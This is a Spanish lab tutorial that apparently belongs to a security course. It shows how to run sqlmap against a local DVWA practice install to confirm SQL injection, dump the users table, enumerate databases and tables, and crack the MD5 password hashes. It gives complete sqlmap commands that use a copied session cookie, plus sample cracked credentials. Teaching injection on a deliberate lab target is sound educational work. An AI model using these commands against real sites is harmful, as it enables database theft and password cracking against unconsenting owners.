---
sidebar_position: 5
title: "Práctica 2: Ataque automático (sqlmap)"
---

# Práctica 2 · Ataque automático con sqlmap

**sqlmap** es la herramienta estrella de Kali Linux para SQL Injection. Con **un solo comando** detecta la vulnerabilidad, roba la base de datos completa y hasta **descifra las contraseñas** automáticamente. Es la demostración más impactante: la pantalla trabaja sola y en segundos aparecen los usuarios con sus contraseñas reales.

El ataque se lanza contra **la misma DVWA que corre en esta computadora** (`http://localhost`). "localhost" significa "este mismo equipo", así que no se ataca ninguna página de internet ni ajena: es el mismo laboratorio de práctica de los pasos anteriores, solo que ahora el ataque es automático.

## Paso 1. Obtener la cookie de sesión

sqlmap necesita entrar a DVWA como si fuera el usuario, así que se le entrega la **cookie de sesión**. En Firefox, estando dentro de DVWA:

1. Presionar `F12` para abrir las herramientas de desarrollo.
2. Ir a la pestaña **Storage** (o **Almacenamiento**) → **Cookies** → `http://localhost`.
3. Copiar el valor de **`PHPSESSID`** (una cadena larga de letras y números).
4. El valor de **`security`** debe ser `low`.

## Paso 2. Lanzar el ataque

Se ejecuta este comando en la terminal, reemplazando `TU_COOKIE` por el valor de PHPSESSID:

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=TU_COOKIE; security=low" --batch --dump -D dvwa -T users
```

¿Qué hace cada parte?

| Parte | Función |
|-------|---------|
| `-u "..."` | La dirección vulnerable a atacar. |
| `--cookie="..."` | La sesión para entrar como usuario válido. |
| `--batch` | Responde "sí" automáticamente a todas las preguntas (nunca se traba). |
| `--dump` | Descarga (roba) el contenido. |
| `-D dvwa -T users` | De la base `dvwa`, la tabla `users`. |

## Paso 3. El resultado

sqlmap confirma la vulnerabilidad, descarga la tabla completa y, al final, pregunta si quiere descifrar los hash. Como se usó `--batch`, lo hace solo con un diccionario y muestra una tabla con:

- cada **usuario**,
- su **hash MD5**,
- y su **contraseña real ya descifrada** (por ejemplo: `admin → password`, `gordonb → abc123`).

> **Por qué impresiona:** lo que una persona haría escribiendo consulta por consulta, sqlmap lo logra en segundos, de forma ordenada y hasta rompiendo el cifrado. Deja claro lo peligrosa que es esta vulnerabilidad en un sistema real.

## Comandos extra (opcionales)

Ver todas las bases de datos:

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=TU_COOKIE; security=low" --batch --dbs
```

Ver las tablas de la base dvwa:

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=TU_COOKIE; security=low" --batch -D dvwa --tables
```

> En todos los comandos, `TU_COOKIE` se reemplaza por el valor real de `PHPSESSID` (F12 → Storage → Cookies → localhost). El `PHPSESSID=` del inicio siempre debe ir.
